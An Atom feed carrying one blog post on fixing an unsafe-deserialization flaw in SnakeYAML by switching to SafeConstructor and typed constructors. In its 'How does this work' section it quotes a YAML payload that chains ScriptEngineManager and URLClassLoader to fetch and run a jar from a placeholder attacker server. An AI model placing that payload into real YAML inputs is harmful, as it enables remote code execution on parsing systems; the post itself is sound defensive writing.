<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Senthilkumar Gopal - Security</title><link href="https://sengopal.github.io/" rel="alternate"></link><link href="https://sengopal.github.io/feeds/security.atom.xml" rel="self"></link><id>https://sengopal.github.io/</id><updated>2022-04-19T00:00:00-07:00</updated><subtitle>Musings of a machine learning researcher, engineer and leader</subtitle><entry><title>Secure Constructor object for SnakeYAML</title><link href="https://sengopal.github.io/posts/secure-constructor-object-for-snakeyaml.html" rel="alternate"></link><published>2022-04-19T00:00:00-07:00</published><updated>2022-04-19T00:00:00-07:00</updated><author><name>Senthilkumar Gopal</name></author><id>tag:sengopal.github.io,2022-04-19:/posts/secure-constructor-object-for-snakeyaml.html</id><summary type="html">This post explores the pitfalls and steps to securely read an YAML file using SnakeYAML library</summary><content type="html">&lt;p&gt;We use &lt;a href="https://bitbucket.org/snakeyaml/snakeyaml/src/master/"&gt;SnakeYAML&lt;/a&gt;
for simple parsing of YAML files in Java, as part of &lt;a href="https://github.com/eBay/ebay-oauth-java-client"&gt;ebay-oauth-java-client&lt;/a&gt;
configuration. We were made aware of a vulnerability within the code due
to the usage of &lt;code&gt;Yaml yaml = new Yaml()&lt;/code&gt; and then following
it with &lt;code&gt;yaml.loadAs(fis, Map.class);&lt;/code&gt;. This issue was first
reported as part of &lt;a href="https://github.com/kubernetes-client/java/issues/1698"&gt;Kubernetes
java client&lt;/a&gt;, but affects any code which uses SnakeYaml for reading
generic types.&lt;/p&gt;
&lt;p&gt;Yaml allows a class type to be tagged in the file using its name such
as &lt;code&gt;!!java.net.URLClassLoader&lt;/code&gt;. So when
&lt;code&gt;yaml.loadAs&lt;/code&gt; loads the file, it instantiates objects for the
tagged classes in the file. SnakeYAML recommends addressing this issue
using &lt;a href="https://bitbucket.org/snakeyaml/snakeyaml/wiki/Documentation#markdown-header-type-safe-collections"&gt;type-safe-collections&lt;/a&gt;
where the object types are defined and a &lt;code&gt;Constructor&lt;/code&gt; object
is used to allow only specific types such as below. &lt;a href="https://bitbucket.org/snakeyaml/snakeyaml/wiki/Documentation#markdown-header-type-safe-collections"&gt;Reference&lt;/a&gt;&lt;/p&gt;
&lt;div class="sourceCode" id="cb1"&gt;&lt;pre class="sourceCode java"&gt;&lt;code class="sourceCode java"&gt;&lt;span id="cb1-1"&gt;&lt;a aria-hidden="true" href="#cb1-1" tabindex="-1"&gt;&lt;/a&gt;&lt;span class="bu"&gt;Constructor&lt;/span&gt; constructor &lt;span class="op"&gt;=&lt;/span&gt; &lt;span class="kw"&gt;new&lt;/span&gt; &lt;span class="bu"&gt;Constructor&lt;/span&gt;&lt;span class="op"&gt;(&lt;/span&gt;Car&lt;span class="op"&gt;.&lt;/span&gt;&lt;span class="fu"&gt;class&lt;/span&gt;&lt;span class="op"&gt;);&lt;/span&gt;&lt;span class="co"&gt;//Car.class is root&lt;/span&gt;&lt;/span&gt;
&lt;span id="cb1-2"&gt;&lt;a aria-hidden="true" href="#cb1-2" tabindex="-1"&gt;&lt;/a&gt;TypeDescription carDescription &lt;span class="op"&gt;=&lt;/span&gt; &lt;span class="kw"&gt;new&lt;/span&gt; &lt;span class="fu"&gt;TypeDescription&lt;/span&gt;&lt;span class="op"&gt;(&lt;/span&gt;Car&lt;span class="op"&gt;.&lt;/span&gt;&lt;span class="fu"&gt;class&lt;/span&gt;&lt;span class="op"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span id="cb1-3"&gt;&lt;a aria-hidden="true" href="#cb1-3" tabindex="-1"&gt;&lt;/a&gt;carDescription&lt;span class="op"&gt;.&lt;/span&gt;&lt;span class="fu"&gt;putListPropertyType&lt;/span&gt;&lt;span class="op"&gt;(&lt;/span&gt;&lt;span class="st"&gt;"wheels"&lt;/span&gt;&lt;span class="op"&gt;,&lt;/span&gt; Wheel&lt;span class="op"&gt;.&lt;/span&gt;&lt;span class="fu"&gt;class&lt;/span&gt;&lt;span class="op"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span id="cb1-4"&gt;&lt;a aria-hidden="true" href="#cb1-4" tabindex="-1"&gt;&lt;/a&gt;constructor&lt;span class="op"&gt;.&lt;/span&gt;&lt;span class="fu"&gt;addTypeDescription&lt;/span&gt;&lt;span class="op"&gt;(&lt;/span&gt;carDescription&lt;span class="op"&gt;);&lt;/span&gt;&lt;/span&gt;
&lt;span id="cb1-5"&gt;&lt;a aria-hidden="true" href="#cb1-5" tabindex="-1"&gt;&lt;/a&gt;Yaml yaml &lt;span class="op"&gt;=&lt;/span&gt; &lt;span class="kw"&gt;new&lt;/span&gt; &lt;span class="fu"&gt;Yaml&lt;/span&gt;&lt;span class="op"&gt;(&lt;/span&gt;constructor&lt;span class="op"&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;However, this does not work for generic types such as
&lt;code&gt;java.util.Map&lt;/code&gt; objects and such generic types are handled
specifically within SnakeYAML using &lt;code&gt;tag:map&lt;/code&gt; or
&lt;code&gt;tag:sequence&lt;/code&gt; for lists.&lt;/p&gt;
&lt;h3 id="how-does-this-work"&gt;How does this work&lt;/h3&gt;
&lt;p&gt;The specifics of this issue is available in &lt;a href="https://j0vsec.com/post/cve-2021-25738/"&gt;detail&lt;/a&gt; by the
original reporter. When the config file contains
&lt;code&gt;some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker-server.tld/poc.jar"]]]]&lt;/code&gt;,
the default Constructor loads the ScriptEngineManager and attempts to
load the jar from a remote location and execute them.&lt;/p&gt;
&lt;h3 id="how-to-address-this"&gt;How to address this&lt;/h3&gt;
&lt;p&gt;YAML specification defines a &lt;a href="http://blogs.perl.org/users/tinita/2018/01/introduction-to-yaml-schemas-and-tags.html"&gt;FailSafe
Schema&lt;/a&gt; which allows only &lt;code&gt;str&lt;/code&gt;,&lt;code&gt;sequence&lt;/code&gt; and
&lt;code&gt;map&lt;/code&gt; and prevents all other types from even being
instantiated. SnakeYaml follows this fail-safe schema using &lt;a href="https://javadoc.io/static/org.yaml/snakeyaml/1.25/org/yaml/snakeyaml/constructor/SafeConstructor.html"&gt;SafeConstructor&lt;/a&gt;.
Using the SafeConstructor to create
&lt;code&gt;Yaml yaml = new Yaml(new SafeConstructor());&lt;/code&gt; prevents any
arbitary class from getting loaded. For specific types, using
&lt;code&gt;TypeDescription&lt;/code&gt; and adding to the constructor object as
shown above ensures only the allowed types are instantiated.&lt;/p&gt;
&lt;h3 id="how-does-this-look"&gt;How does this look&lt;/h3&gt;
&lt;p&gt;The below is an inside look of all the allowed types using the
default &lt;code&gt;new Constructor()&lt;/code&gt; and the
&lt;code&gt;yamlClassConstructors&lt;/code&gt; has the &lt;code&gt;scalar&lt;/code&gt; and
&lt;code&gt;sequence&lt;/code&gt; classes which allows the arbitrary class
instantiation.&lt;/p&gt;
&lt;p&gt;&lt;img src="/extras/images/snakeyaml/regular_constructor_sequence_tag.png"/&gt;&lt;/p&gt;
&lt;p&gt;However, once the &lt;code&gt;new Constructor()&lt;/code&gt; is substituted with
&lt;code&gt;new SafeConstructor()&lt;/code&gt;, the arbitrary code will fail with
the following error confirming that the issue has been addressed.&lt;/p&gt;
&lt;p&gt;&lt;img alt="drawing" src="/extras/images/snakeyaml/safe_constructor_error.png" width="950"/&gt;&lt;/p&gt;</content><category term="Security"></category><category term="security"></category><category term="java"></category></entry></feed>